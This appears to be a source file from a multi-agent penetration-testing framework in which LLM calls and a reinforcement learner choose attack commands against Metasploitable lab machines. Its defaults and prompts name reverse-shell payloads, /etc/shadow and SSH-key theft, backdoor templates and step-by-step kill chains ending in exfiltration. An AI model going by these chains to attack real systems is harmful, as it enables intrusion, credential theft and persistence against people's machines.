            confidence=0.3,
            source="forced",
            forced=True,
            forced_reason="random_fallback",
            excluded_count=0,
            tag_info="random_fallback",
        )
    
    def _get_default_param(self, param: str, ctx: "AttackContext") -> str:
        """Get default value for a required parameter.

        Provides sensible defaults for ALL known command template parameters.
        The fallback for truly unknown params is the target IP, but every
        param name used in the 144+ command registry should be listed here
        to avoid mis-substitution (e.g. ports or lport getting an IP value).
        """
        # Target-aware port and credential defaults
        is_ms3 = ctx.target in ("172.28.0.11",) or getattr(ctx, 'difficulty', '') == 'medium'
        if is_ms3:
            # Phase 7.3: VERIFIED — only these ports are open on the real MS3 Docker
            target_ports = "21,22,111,139,445,3306"
            # Phase 7.3: VERIFIED — msfadmin:msfadmin works, vagrant does NOT
            default_user = "msfadmin"
            default_pass = "msfadmin"
            default_rport = "22"
        else:
            target_ports = "21,22,23,25,80,139,445,512,513,514,1099,1524,2049,3306,5432,5900,6667,8180"
            default_user = "msfadmin"
            default_pass = "msfadmin"
            default_rport = "445"
        # Attacker IP — same subnet as target, .1 gateway convention
        parts = ctx.target.rsplit(".", 1)
        attacker_ip = f"{parts[0]}.1" if len(parts) == 2 else "172.28.0.1"

        defaults = {
            # ─── Target identifiers ──────────────────────────────
            "target": ctx.target,
            "ip": ctx.target,
            "host": ctx.target,
            "rhost": ctx.target,
            "rhosts": ctx.target,
            "target_range": f"{ctx.target}/24",
            "url": f"http://{ctx.target}",
            "domain": ctx.target,
            "subnet": parts[0] if len(parts) == 2 else "172.28.0",
            # ─── Ports ───────────────────────────────────────────
            "port": "80",
            "ports": target_ports,
            "rport": default_rport,
            "lport": "4444",
            "num_ports": "100",
            "rate": "5000",
            # ─── Attacker / listener ─────────────────────────────
            "lhost": attacker_ip,
            "attacker": attacker_ip,
            # ─── Credentials ─────────────────────────────────────
            "user": default_user,
            "username": default_user,
            "password": default_pass,
            "userlist": "/usr/share/nmap/nselib/data/usernames.lst",
            "passlist": "/usr/share/nmap/nselib/data/passwords.lst",
            # ─── Wordlists ───────────────────────────────────────
            "wordlist": "/usr/share/dirb/wordlists/common.txt",
            # ─── Metasploit / payloads ───────────────────────────
            "module": "exploit/unix/ftp/vsftpd_234_backdoor",
            "payload": "linux/x86/shell_reverse_tcp",
            "format": "elf",
            "output": "/tmp/payload.elf",
            # ─── SMB / NFS / LDAP ────────────────────────────────
            "share": "tmp",
            "export": "/",
            "mountpoint": "/tmp/nfs_mount",
            "base_dn": "dc=metasploitable,dc=local",
            "community": "public",
            "version": "2c",
            # ─── SSH / auth ──────────────────────────────────────
            "keyfile": "/root/.ssh/id_rsa",
            "hash": "",
            # ─── Web form / injection ────────────────────────────
            "post_data": "username=admin&password=admin",
            "form_path": "/login",
            "form_data": "username=^USER^&password=^PASS^",
            "fail_string": "Invalid",
            # ─── Scanning / enumeration ──────────────────────────
            "query": "exploit",
            "enumerate": "vp,vt,u",
            "templates": "cves/",
            "severity": "medium,high,critical",
            "extensions": "php,html,txt,bak",
            "threads": "10",
            "token": "",
            # ─── Exfiltration / post-exploit ─────────────────────
            "path": "/etc/",
            "file": "/etc/shadow",
            "remote_path": "/tmp/loot/",
            "command": f"/bin/bash -c 'id'",
            "public_key": "ssh-rsa AAAA_placeholder_key root@attacker",
        }
        # Fallback: only use target IP for truly target-like unknown params
        return defaults.get(param, ctx.target)
    
    # =========================================================================
    # PHASE 7.1: FORWARD-ONLY PHASE GATING + EXPLOITED-SERVICE FILTER
    # =========================================================================
    
    # Phase ordering for forward-only gating
    PHASE_ORDER = {
        AttackPhase.RECON: 0,
        AttackPhase.ENUMERATION: 1,
        AttackPhase.EXPLOITATION: 2,
        AttackPhase.PRIVILEGE_ESCALATION: 3,
        AttackPhase.LATERAL_MOVEMENT: 4,
        AttackPhase.POST_EXPLOITATION: 5,
        AttackPhase.EXFILTRATION: 6,
        AttackPhase.CLOSEOUT: 7,
    }
    
    # Exceptions: some backward-phase commands are legitimate
    # e.g., "nmap" in EXPLOITATION if we need to re-scan a new subnet
    PHASE_GATE_EXCEPTIONS = {
        # Commands allowed to run 1 phase behind current phase
        "nmap_service_version",  # Re-scan to verify version during exploitation
        "curl_headers",          # Quick HTTP check during any phase
        "whatweb",               # Quick web fingerprint
    }
    
    def _filter_phase_forward(
        self, commands: List[CommandTemplate], current_phase: AttackPhase
    ) -> List[CommandTemplate]:
        """
        Filter commands to only allow current phase or forward phases.
        
        Phase 7.1: Prevents agents from running RECON commands during EXPLOITATION,
        or EXPLOITATION commands during EXFILTRATION. Forward-only progression.
        
        Args:
            commands: List of candidate commands
            current_phase: The current attack phase
            
        Returns:
            Commands from current phase or ahead (with some exceptions)
        """
        current_order = self.PHASE_ORDER.get(current_phase, 0)
        
        forward_commands = []
        for cmd in commands:
            cmd_order = self.PHASE_ORDER.get(cmd.phase, 0)
            
            # Allow current phase and forward
            if cmd_order >= current_order:
                forward_commands.append(cmd)
            # Phase 7.2: No exceptions during late phases (POST_EXPLOITATION+)
            # Only allow 1-phase-behind exceptions during early/mid phases
            elif (cmd_order >= current_order - 1 
                  and cmd.name in self.PHASE_GATE_EXCEPTIONS
                  and current_order < 5):  # < POST_EXPLOITATION
                forward_commands.append(cmd)
        
        # If filtering removed ALL commands (unusual), allow current phase only
        if not forward_commands:
            forward_commands = [
                cmd for cmd in commands
                if cmd.phase == current_phase
            ]
        
        # If still empty, don't filter — return original
        return forward_commands if forward_commands else commands
    
    def _filter_exploited_services(
        self, commands: List[CommandTemplate], ctx: AttackContext
    ) -> List[CommandTemplate]:
        """
        Filter out exploit commands targeting already-exploited services/ports.
        
        Phase 7.1: If a shell was obtained via FTP exploit, don't run FTP exploits again.
        Uses the discovery_board's exploited_services and exploited_ports sets.
        
        Args:
            commands: List of candidate commands
            ctx: Attack context with discovery board info
            
        Returns:
            Commands that don't target already-exploited services
        """
        exploited_services = ctx.state_flags.get("_exploited_services", set())
        exploited_ports = ctx.state_flags.get("_exploited_ports", set())
        
        if not exploited_services and not exploited_ports:
            return commands
        
        filtered = []
        for cmd in commands:
            # Only filter exploit-phase commands
            if cmd.phase not in (AttackPhase.EXPLOITATION, AttackPhase.PRIVILEGE_ESCALATION):
                filtered.append(cmd)
                continue
            
            # Check if this exploit targets an already-exploited service
            cmd_lower = cmd.name.lower() + " " + (cmd.template.lower() if hasattr(cmd, 'template') else "")
            is_exploiting_done = False
            
            for svc in exploited_services:
                svc_name = str(svc).lower().split("/")[0]
                if svc_name in cmd_lower:
                    is_exploiting_done = True
                    logger.debug(
                        f"[PHASE-GATE] {self.agent_name}: Blocking {cmd.name} — "
                        f"service '{svc}' already exploited"
                    )
                    break
            
            if not is_exploiting_done:
                filtered.append(cmd)
        
        return filtered if filtered else commands
    
    # Commands that search for credentials — redundant once creds are known
    CRED_SEARCH_COMMANDS = {
        "hydra_ssh", "hydra_ftp", "hydra_http", "hydra_mysql",
        "medusa_ssh", "medusa_ftp", "brute_force", "brute_ssh",
        "patator_ssh", "ncrack_ssh", "john_crack", "hashcat_crack",
        "cewl_wordlist", "crunch_wordlist",
    }

    def _filter_creds_aware(
        self, commands: List[CommandTemplate], ctx: AttackContext
    ) -> List[CommandTemplate]:
        """
        Phase 7.2: Remove brute-force/credential-search commands when credentials
        are already known. This prevents wasted cycles AND avoids burning mentor
        reasoning tokens on 'why am I running hydra when I have creds' questions.
        
        Returns:
            Filtered list with credential-search commands removed (if creds known)
        """
        if not ctx.state_flags.get("credentials_known"):
            return commands
        
        filtered = [
            cmd for cmd in commands
            if cmd.name not in self.CRED_SEARCH_COMMANDS
            and not any(kw in cmd.name.lower() for kw in ["brute", "hydra", "crack", "wordlist"])
        ]
        
        if filtered:
            removed = len(commands) - len(filtered)
            if removed > 0:
                logger.debug(
                    f"[CRED-FILTER] {self.agent_name}: Removed {removed} "
                    f"credential-search commands (creds already known)"
                )
            return filtered
        return commands  # Don't remove everything

    def _ask_mentor_reasoning(
        self, step_ctx: SmartStepContext, question: str
    ) -> Optional[str]:
        """
        Ask codex-mini a quick reasoning question (e.g., 'should I move to next phase?').
        
        Phase 7.1: Token-efficient reasoning check. Uses max_tokens=150 to keep costs low.
        Only called when agent is genuinely unsure — not on every step.
        
        Args:
            step_ctx: Current step context
            question: The reasoning question to ask
            
        Returns:
            Short reasoning answer, or None if LLM unavailable
        """
        if not self.gpt_manager or self.gpt_manager.is_offline():
            return None
        
        ctx = step_ctx.attack_context
        # Phase 8.0: Rich reasoning context with chain memory + failures
        _ports = ctx.discoveries.get("ports", []) if isinstance(ctx.discoveries, dict) else []
        _services = ctx.services_found if hasattr(ctx, "services_found") else []
        
        # Build enriched prompt with cross-episode learning
        _failures_str = ""
        if self._reasoning_failures:
            _failures_str = f"\nPrevious failures: {'; '.join(self._reasoning_failures[-3:])}"
        _chain_str = ""
        if self._best_chain:
            _best_cmds = self._best_chain["commands"][:5]
            _chain_str = f"\nBest attack chain from past episodes: {' -> '.join(_best_cmds)}"
        _plan_str = ""
        if self._reasoning_plan:
            _plan_str = f"\nCurrent plan: {self._reasoning_plan[:100]}"
        
        # Phase 8.1: Team coordination context — what other agents found
        _team_ctx = ""
        _disc_board = getattr(step_ctx, 'state', {}).get('discovery_board', {})
        if _disc_board:
            _team_ports = list(_disc_board.get('ports', set()))[:10]
            _team_services = list(_disc_board.get('services', set()))[:5]
            _team_creds = list(_disc_board.get('credentials', set()))[:3]
            _team_shells = list(_disc_board.get('shells', set()))[:2]
            if _team_ports or _team_services or _team_creds:
                _team_ctx = (f"\nTeam findings: ports={_team_ports}, "
                             f"services={_team_services}, creds={_team_creds}, "
                             f"shells={_team_shells}")
        
        compact_prompt = (
            f"You are a senior penetration tester coordinating a team of 5 agents "
            f"(Red=offense, Scout=recon, Shadow=stealth, Blue=defense, Orion=strategy) "
            f"attacking Metasploitable 3.\n"
            f"Target: {ctx.target} | Phase: {ctx.current_phase.name} | "
            f"Ports: {', '.join(str(p) for p in list(_ports)[:10])} | "
            f"Services: {', '.join(str(s) for s in _services[:5])} | "
            f"Creds: {'msfadmin:msfadmin' if ctx.state_flags.get('credentials_known') else 'unknown'} | "
            f"Shell: {'YES' if ctx.state_flags.get('shell_obtained') else 'NO'} | "
            f"Root: {'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}"
            f"{_team_ctx}{_failures_str}{_chain_str}{_plan_str}\n"
            f"\nMS3 KILL CHAINS (proven paths):\n"
            f"1. SSH: nmap→ssh_login msfadmin:msfadmin→sudo su→dump /etc/shadow→exfil\n"
            f"2. ProFTPD: nmap→ftp_anon 21→proftpd_exploit→shell→privesc→exfil\n"
            f"3. Samba: enum4linux→samba_exploit 445→shell→dump credentials→exfil\n"
            f"4. MySQL: mysql_root_login root:sploitme→db_dump→exfil via base64\n"
            f"5. Ingreslock: telnet {ctx.target} 1524→instant root→dump shadow→exfil\n"
            f"\nThink like a team: plan 2-3 steps ahead, suggest the NEXT logical action."
            f"\nAnswer in 1-2 concrete sentences with specific tool/command.\n"
            f"Question: {question}"
        )
        
        try:
            response = self.gpt_manager.gpt_request(
                compact_prompt,
                task_type="reasoning",
                agent_id=self.agent_name,
                max_tokens=150,
                model="gpt-5.1-codex-mini",
            )
            if response:
                logger.info(
                    f"[MENTOR-REASONING] {self.agent_name}: Q={question[:60]} → "
                    f"A={response[:100]}"
                )
                # Phase 8.0: Store reasoning as hypothesis/plan for context
                clean = response.strip()
                if "should" in clean.lower() or "try" in clean.lower() or "use" in clean.lower():
                    self._reasoning_plan = clean[:200]
                self._reasoning_hypotheses.append(clean[:100])
                if len(self._reasoning_hypotheses) > 5:
                    self._reasoning_hypotheses = self._reasoning_hypotheses[-5:]
                return clean
        except Exception as e:
            logger.debug(f"Mentor reasoning check failed: {e}")
        
        return None

    # =====================================================================
    # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
    # =====================================================================

    # R60: Phase-compatible template recommendations for Codex Meta.
    # Maps phase → list of high-value template_names the Codex can recommend.
    # These are all KNOWN templates in the registry, so PHASE-GATE will recognize them.
    _CODEX_PHASE_TEMPLATES = {
        AttackPhase.EXPLOITATION: [
            "ssh_login", "msfconsole_exploit", "msfconsole_auto", "mysql_login",
            "mssql_login", "vsftpd_exploit", "sqlmap_get", "sqlmap_shell",
            "nfs_mount", "hydra_ssh", "hydra_ftp", "hydra_smb",
            "impacket_psexec", "evil_winrm", "msfvenom_payload",
            "crackmapexec_smb_bruteforce", "ssh_key_login",
        ],
        AttackPhase.PRIVILEGE_ESCALATION: [
            "sudo_list", "find_suid", "find_capabilities", "linpeas",
            "kernel_exploit_check", "find_writable_etc", "sudo_check",
            "find_sgid", "cron_check", "writable_etc_passwd",
            "capability_check", "docker_privesc", "lxd_privesc",
            "pspy_monitor", "ssh_key_plant",
        ],
        AttackPhase.LATERAL_MOVEMENT: [
            "ssh_lateral", "ssh_tunnel_local", "ssh_tunnel_dynamic",
            "pivot_scan", "nmap_pivot", "proxychains_scan",
            "chisel_client", "impacket_pth_psexec", "crackmapexec_pth",
        ],
        AttackPhase.POST_EXPLOITATION: [
            "credential_dump", "hashdump", "dump_shadow", "dump_passwd",
            "history_dump", "network_config_dump", "ssh_key_harvest",
            "plant_ssh_key", "cron_backdoor", "impacket_secretsdump",
        ],
        AttackPhase.ENUMERATION: [
            "gobuster_dir", "nikto_scan", "enum4linux_full",
            "smbclient_list", "smbmap_shares", "snmpwalk",
            "showmount", "rpcclient_null", "ftp_anonymous",
            "nuclei_scan", "wpscan", "searchsploit",
        ],
    }

    def _codex_meta_check(
        self,
        step_ctx: SmartStepContext,
        current_phase: AttackPhase,
        filtered_commands: List[CommandTemplate],
    ) -> Optional[SmartDecisionResult]:
        """
        Layer 3: Codex Meta-Layer — Strategic stagnation-breaking with gpt-5.2-codex.

        R60 UPGRADE: Now outputs phase-compatible template_names instead of raw
        commands. Codex returns JSON with recommended_template that maps to the
        command registry, ensuring PHASE-GATE sees a valid phase-compatible command.

        Trigger conditions (R60 — more permissive):
            1. Stagnation: EXPLOITATION ≥8, PRIV_ESC ≥4, LATERAL ≥5, ENUM ≥10
            2. Anti-repeat spike: 3+ anti-repeat hits within last 5 steps
            3. PHASE-GATE override storm: 3+ gate overrides in last 5 steps

        Budget: 5 calls/episode, 2-step cooldown between calls.
        Only fires for offensive agents (RedAgent is the primary learner).
        """
        # Budget check — R67: adaptive budget boost when velocity stalls
        _effective_budget = self._codex_meta_max_per_episode + self._r67_codex_bonus_budget
        if self._codex_meta_calls_episode >= _effective_budget:
            return None

        # R67: Grant bonus codex budget when reward velocity is stalling
        if self._r67_stalling and self._r67_codex_bonus_budget < 3:
            self._r67_codex_bonus_budget += 1
            logger.info(
                f"[CODEX-META][{self.agent_name}] R67 velocity stall → "
                f"bonus budget +1 (now {_effective_budget + 1})"
            )

        # Cooldown check
        if self._codex_meta_cooldown > 0:
            self._codex_meta_cooldown -= 1
            return None

        # Track steps in current phase (independent of _stagnation_steps)
        if current_phase != self._codex_meta_last_phase:
            self._codex_meta_phase_steps = 0
            self._codex_meta_last_phase = current_phase
        self._codex_meta_phase_steps += 1

        # Phase-specific stagnation thresholds (R60: lowered)
        _CODEX_THRESHOLDS = {
            AttackPhase.EXPLOITATION: 8,
            AttackPhase.PRIVILEGE_ESCALATION: 4,
            AttackPhase.LATERAL_MOVEMENT: 5,
            AttackPhase.ENUMERATION: 10,
            AttackPhase.POST_EXPLOITATION: 6,
        }
        threshold = _CODEX_THRESHOLDS.get(current_phase, 12)

        # R60: Multiple trigger conditions (any one sufficient)
        _stagnation_trigger = (
            self._codex_meta_phase_steps >= threshold
            and (self._codex_meta_phase_steps - threshold) % 4 == 0
        )
        _antirepeat_spike = self._codex_meta_antirepeat_hits >= 3
        _gate_storm = self._codex_meta_gate_overrides >= 3
        # R67: Reward velocity stall trigger
        _velocity_stall = self._r67_stalling and self._codex_meta_phase_steps >= 3

        if not (_stagnation_trigger or _antirepeat_spike or _gate_storm or _velocity_stall):
            return None

        # Reset spike counters on trigger
        if _antirepeat_spike:
            self._codex_meta_antirepeat_hits = 0
        if _gate_storm:
            self._codex_meta_gate_overrides = 0

        # Only for offensive agents (Red is the primary attack learner)
        if self.agent_role.get("role") != "offensive":
            return None

        # GPT must be available
        if self.gpt_manager is None or self.gpt_manager.is_offline():
            return None

        # Build strategic context from discovery board and attack context
        ctx = step_ctx.attack_context
        discovery_board = step_ctx.state.get("discovery_board", {})
        recent_cmds = (ctx.command_history or [])[-8:]

        _ports = sorted(list(discovery_board.get("ports", set())))[:15]
        _services = sorted(list(discovery_board.get("services", set())))[:10]
        _creds = list(discovery_board.get("credentials", set()))[:5]
        _shells = list(discovery_board.get("shells", set()))[:3]

        # Include best chain from cross-episode memory for context
        _chain_hint = ""
        if self._best_chain:
            _best_cmds = self._best_chain.get("commands", [])[:5]
            _chain_hint = (
                f"\nBest attack chain from past episodes (reward={self._best_chain.get('reward', 0):.0f}): "
                + " → ".join(_best_cmds)
            )

        # R60: Build list of valid templates for current phase
        valid_templates = self._CODEX_PHASE_TEMPLATES.get(current_phase, [])
        # Also include templates from adjacent phase (+1)
        _next_phase_order = self.PHASE_ORDER.get(current_phase, 0) + 1
        for phase, order in self.PHASE_ORDER.items():
            if order == _next_phase_order:
                valid_templates = valid_templates + self._CODEX_PHASE_TEMPLATES.get(phase, [])
                break

        # Determine trigger reason for the prompt
        _trigger_reason = "stagnation"
        if _antirepeat_spike:
            _trigger_reason = "anti-repeat spike (3+ blocked commands in 5 steps)"
        elif _gate_storm:
            _trigger_reason = "phase-gate override storm (3+ overrides in 5 steps)"
        elif _velocity_stall:
            _trigger_reason = f"reward velocity stall (v={self._r67_velocity:.1f})"

        prompt = (
            f"TACTICAL STAGNATION ANALYSIS — Phase: {current_phase.name}\n"
            f"Trigger: {_trigger_reason}. Steps in phase: {self._codex_meta_phase_steps}.\n"
            f"Target: {ctx.target} (Metasploitable 2/3 — Linux)\n"
            f"Coherence: {self._r66_coherence:.2f}  Macro confidence: {self._r66_macro_conf:.2f}\n"
            f"Reward velocity: {self._r67_velocity:.1f}  Stalling: {self._r67_stalling}\n\n"
            f"Current state:\n"
            f"- Ports discovered: {_ports}\n"
            f"- Services: {_services}\n"
            f"- Credentials: {_creds if _creds else 'msfadmin:msfadmin (default)'}\n"
            f"- Shells: {_shells}\n"
            f"- Flags: shell={'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}, "
            f"root={'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}, "
            f"creds={'YES' if ctx.state_flags.get('credentials_known') else 'NO'}, "
            f"hash={'YES' if ctx.state_flags.get('hash_known') else 'NO'}\n\n"
            f"Recent commands tried (all failed to advance):\n"
            + "\n".join(f"  {i+1}. {cmd[:80]}" for i, cmd in enumerate(recent_cmds))
            + f"{_chain_hint}\n\n"
            f"AVAILABLE TEMPLATES for {current_phase.name} (choose from these):\n"
            + ", ".join(t for t in valid_templates[:20] if t not in self._codex_meta_used_templates)
            + (f"\n\nALREADY USED THIS EPISODE (DO NOT repeat): {', '.join(self._codex_meta_used_templates)}" if self._codex_meta_used_templates else "")
            + f"\n\nRespond with ONLY a JSON object (no markdown, no backticks):\n"
            '{"recommended_template": "template_name", "reason": "brief why", '
            '"blocked_families": ["families_to_avoid"], "confidence": 0.8}\n'
            f"Pick the single best NEW template to break stagnation in {current_phase.name}."
        )

        try:
            response = self.gpt_manager.gpt_request(
                prompt=prompt,
                task_type="strategic",  # Routes to gpt-5.2-codex
                agent_id=self.agent_name,
                max_tokens=200,
            )

            if not response or not isinstance(response, str) or len(response.strip()) < 5:
                return None

            # R60: Parse JSON response and map to template
            _chosen_template_name = None
            _codex_reason = ""
            _codex_confidence = 0.80

            # Try JSON parse first
            try:
                import json as _json
                # Strip markdown code fences if present
                _clean = response.strip()
                if _clean.startswith("```"):
                    _clean = _clean.split("\n", 1)[-1].rsplit("```", 1)[0].strip()
                _parsed = _json.loads(_clean)
                _chosen_template_name = _parsed.get("recommended_template")
                _codex_reason = _parsed.get("reason", "")[:120]
                _codex_confidence = min(0.95, max(0.5, float(_parsed.get("confidence", 0.8))))
            except (ValueError, TypeError, KeyError):
                # Fallback: treat response as a template name directly
                _candidate = response.strip().split("\n")[0].strip().strip('"').strip("'")
                # Remove common LLM artifacts
                for prefix in ("template:", "recommended_template:", "> "):
                    if _candidate.lower().startswith(prefix):
                        _candidate = _candidate[len(prefix):].strip()
                _chosen_template_name = _candidate
                _codex_reason = "raw-response-fallback"

            if not _chosen_template_name:
                logger.debug(f"[CODEX-META] No template in response: {response[:80]}")
                return None

            # Look up template in registry
            _template = COMMAND_REGISTRY.get(_chosen_template_name)

            # R60: If exact match fails, try fuzzy match within valid templates
            if _template is None:
                _name_lower = _chosen_template_name.lower().replace("-", "_")
                for vt in valid_templates:
                    if vt.lower() == _name_lower or _name_lower in vt.lower():
                        _template = COMMAND_REGISTRY.get(vt)
                        if _template:
                            _chosen_template_name = vt
                            break

            # If still not found, fall back to a random phase-appropriate template
            if _template is None:
                logger.info(
                    f"[CODEX-META][{self.agent_name}] Template '{_chosen_template_name}' "
                    f"not found in registry. Falling back to phase-appropriate random."
                )
                _phase_templates = [
                    COMMAND_REGISTRY.get(t) for t in valid_templates
                    if COMMAND_REGISTRY.get(t) is not None
                ]
                if _phase_templates:
                    _template = random.choice(_phase_templates)
                    _chosen_template_name = _template.name
                    _codex_reason = f"codex-fallback: {_codex_reason}"
                else:
                    return None

            # Render the command from the template
            params = {"target": ctx.target}
            for param in _template.required_params:
                if param not in params:
                    params[param] = self._get_default_param(param, ctx)
            command = render_command(_template, params)

            self._codex_meta_calls_episode += 1
            # R62: Track used template for dedup; adaptive cooldown
            if _chosen_template_name in self._codex_meta_used_templates:
                self._codex_meta_cooldown = 4  # Repeat → longer cooldown
            else:
                self._codex_meta_cooldown = 2  # New template → normal cooldown
            self._codex_meta_used_templates.add(_chosen_template_name)

            logger.info(
                f"[CODEX-META][{self.agent_name}] Stagnation break at "
                f"{current_phase.name} step {self._codex_meta_phase_steps}: "
                f"template={_chosen_template_name} reason={_codex_reason[:60]} "
                f"trigger={_trigger_reason[:30]}"
            )

            # R68: Force PPO to use a different phase-head on next step
            # When codex breaks stagnation, nudge PPO to think from a
            # different phase perspective for diversity
            _PHASE_TO_GROUP = {
                AttackPhase.RECON: 0, AttackPhase.ENUMERATION: 0,
                AttackPhase.EXPLOITATION: 1, AttackPhase.PRIVILEGE_ESCALATION: 1,
                AttackPhase.LATERAL_MOVEMENT: 2, AttackPhase.POST_EXPLOITATION: 2,
                AttackPhase.EXFILTRATION: 2, AttackPhase.CLOSEOUT: 2,
            }
            _current_group = _PHASE_TO_GROUP.get(current_phase, 0)
            # Rotate to next group (0→1→2→0) for diversity
            self._r68_forced_phase_group = (_current_group + 1) % 3
            logger.debug(
                f"[R68-CODEX][{self.agent_name}] Forcing next PPO phase_group="
                f"{self._r68_forced_phase_group} (was {_current_group})"
            )

            result = SmartDecisionResult(
                command=command,
                source="codex_meta",
                confidence=_codex_confidence,
                template_name=_chosen_template_name,  # R60: Now set! PHASE-GATE sees valid template
                params=params,
                reasoning=(
                    f"[CODEX-META] {_trigger_reason}: "
                    f"{self._codex_meta_phase_steps} steps in {current_phase.name}. "
                    f"Template={_chosen_template_name}. {_codex_reason}"
                ),
                mentor_call=True,
                model_used="gpt-5.2-codex",
                mentor_reasoning=(
                    f"[CODEX-META] Strategic override → {_chosen_template_name} "
                    f"({current_phase.name} step {self._codex_meta_phase_steps}). "
                    f"Call {self._codex_meta_calls_episode}/{self._codex_meta_max_per_episode}"
                ),
                phase=current_phase,
            )
            return result
        except Exception as e:
            logger.debug(f"[CODEX-META][{self.agent_name}] Call failed: {e}")

        return None

    def _codex_strategic_check(
        self,
        step_ctx: SmartStepContext,
        current_phase: AttackPhase,
        filtered_commands: List[CommandTemplate],
    ) -> Optional[SmartDecisionResult]:
        """
        R66 Layer 3b: Codex Strategic — Episode-level plan repair.

        Fires when overall episode progress is poor:
          - Step ≥ 15 and still in RECON/ENUMERATION
          - Coherence collapsing (<0.30 for 3+ steps)
          - Step ≥ 25 and not yet reached POST_EXPLOITATION

        Separate budget from codex_tactical (3 calls/episode, 3-step cooldown).
        Uses a broader prompt asking for a multi-step attack plan.
        """
        if self._codex_strategic_calls_episode >= self._codex_strategic_max_per_episode:
            return None
        if self._codex_strategic_cooldown > 0:
            self._codex_strategic_cooldown -= 1
            return None
        # Only for offensive agents
        if self.agent_role.get("role") != "offensive":
            return None
        if self.gpt_manager is None or self.gpt_manager.is_offline():
            return None

        step_num = step_ctx.step
        _coherence = self._r66_coherence
        _phase_order = self.PHASE_ORDER.get(current_phase, 0)

        # Trigger conditions
        _early_stuck = (step_num >= 15 and _phase_order <= 1)  # RECON/ENUM at step 15+
        _late_stuck = (step_num >= 25 and _phase_order < 5)  # not POST_EXPLOITATION by step 25
        _coherence_collapse = (_coherence < 0.30)

        if not (_early_stuck or _late_stuck or _coherence_collapse):
            return None

        ctx = step_ctx.attack_context
        discovery_board = step_ctx.state.get("discovery_board", {})
        recent_cmds = (ctx.command_history or [])[-10:]
        _ports = sorted(list(discovery_board.get("ports", set())))[:15]
        _services = sorted(list(discovery_board.get("services", set())))[:10]
        _creds = list(discovery_board.get("credentials", set()))[:5]
        _shells = list(discovery_board.get("shells", set()))[:3]

        _trigger = "early_stuck" if _early_stuck else ("late_stuck" if _late_stuck else "coherence_collapse")

        prompt = (
            f"STRATEGIC PLAN REPAIR — Episode step {step_num}, Phase: {current_phase.name}\n"
            f"Trigger: {_trigger}. Coherence: {_coherence:.2f}. Macro conf: {self._r66_macro_conf:.2f}\n"
            f"Target: {ctx.target} (Metasploitable 2/3 — Linux)\n\n"
            f"Current state:\n"
            f"- Ports: {_ports}\n- Services: {_services}\n"
            f"- Credentials: {_creds if _creds else 'msfadmin:msfadmin (default)'}\n"
            f"- Shells: {_shells}\n"
            f"- Flags: shell={'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}, "
            f"root={'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}\n\n"
            f"Recent commands (last 10):\n"
            + "\n".join(f"  {i+1}. {cmd[:80]}" for i, cmd in enumerate(recent_cmds))
            + f"\n\nWe are falling behind. Provide a 3-step attack plan to reach CLOSEOUT.\n"
            f"For each step, name the template_name from the command registry.\n"
            f"Respond with ONLY a JSON object (no markdown):\n"
            '{"plan": [{"template": "name1", "reason": "why"}, '
            '{"template": "name2", "reason": "why"}, '
            '{"template": "name3", "reason": "why"}], "confidence": 0.8}\n'
        )

        try:
            response = self.gpt_manager.gpt_request(
                prompt=prompt,
                task_type="strategic",
                agent_id=self.agent_name,
                max_tokens=300,
            )
            if not response or not isinstance(response, str) or len(response.strip()) < 5:
                return None

            import json as _json
            _clean = response.strip()
            if _clean.startswith("```"):
                _clean = _clean.split("\n", 1)[-1].rsplit("```", 1)[0].strip()
            _parsed = _json.loads(_clean)
            _plan = _parsed.get("plan", [])
            _codex_conf = min(0.95, max(0.5, float(_parsed.get("confidence", 0.8))))

            if not _plan:
                return None

            # Use the FIRST template from the plan
            _chosen_name = _plan[0].get("template", "")
            _reason = _plan[0].get("reason", "")[:100]

            # Look up in registry
            _template = COMMAND_REGISTRY.get(_chosen_name)
            if _template is None:
                # Fuzzy match
                _name_lower = _chosen_name.lower().replace("-", "_")
                for vt_name, vt in COMMAND_REGISTRY.items():
                    if vt_name.lower() == _name_lower or _name_lower in vt_name.lower():
                        _template = vt
                        _chosen_name = vt_name
                        break
            if _template is None:
                # Fallback to a random phase-appropriate template
                valid_templates = self._CODEX_PHASE_TEMPLATES.get(current_phase, [])
                _phase_templates = [
                    COMMAND_REGISTRY.get(t) for t in valid_templates
                    if COMMAND_REGISTRY.get(t) is not None
                ]
                if _phase_templates:
                    import random
                    _template = random.choice(_phase_templates)
                    _chosen_name = _template.name
                    _reason = f"strategic-fallback: {_reason}"
                else:
                    return None

            params = {"target": ctx.target}
            for param in _template.required_params:
                if param not in params:
                    params[param] = self._get_default_param(param, ctx)
            command = render_command(_template, params)

            self._codex_strategic_calls_episode += 1
            self._codex_strategic_cooldown = 3
            self._codex_meta_used_templates.add(_chosen_name)  # shared dedup

            logger.info(
                f"[CODEX-STRATEGIC][{self.agent_name}] Plan repair at step {step_num}: "
                f"template={_chosen_name} trigger={_trigger} plan_depth={len(_plan)}"
            )

            result = SmartDecisionResult(
                command=command,
                source="codex_meta",  # Keep source compatible with metrics
                confidence=_codex_conf,
                template_name=_chosen_name,
                params=params,
                reasoning=(
                    f"[CODEX-STRATEGIC] {_trigger}: step {step_num} in {current_phase.name}. "
                    f"Template={_chosen_name}. {_reason}"
                ),
                mentor_call=True,
                model_used="gpt-5.2-codex",
                mentor_reasoning=(
                    f"[CODEX-STRATEGIC] Plan repair → {_chosen_name}. "
                    f"Call {self._codex_strategic_calls_episode}/{self._codex_strategic_max_per_episode}"
                ),
                phase=current_phase,
            )
            return result
        except Exception as e:
            logger.debug(f"[CODEX-STRATEGIC][{self.agent_name}] Call failed: {e}")

        return None

    def decide(
        self,
        step_ctx: SmartStepContext,
        proposed_action: Optional[str] = None,
        confidence: Optional[float] = None,
        force_mentor: bool = False,
    ) -> SmartDecisionResult:
        """
        Make a smart decision using HYBRID mode: registry-first, GPT for strategy.
        
        HYBRID MODE LOGIC:
        1. Registry-first: Use command registry for 80% of decisions (token efficient)
        2. GPT called ONLY when:
           a) Phase transition detected (need strategic planning)
           b) Agent is stuck (repeated actions, needs new ideas)
           c) No valid registry commands match current state
           d) force_mentor=True passed explicitly
        
        Args:
            step_ctx: Step context with attack state
            proposed_action: Agent's proposed action (optional, may be overridden)
            confidence: Agent's confidence (0-1)
            force_mentor: Force GPT call regardless of other conditions
            
        Returns:
            SmartDecisionResult with command and full context
        """
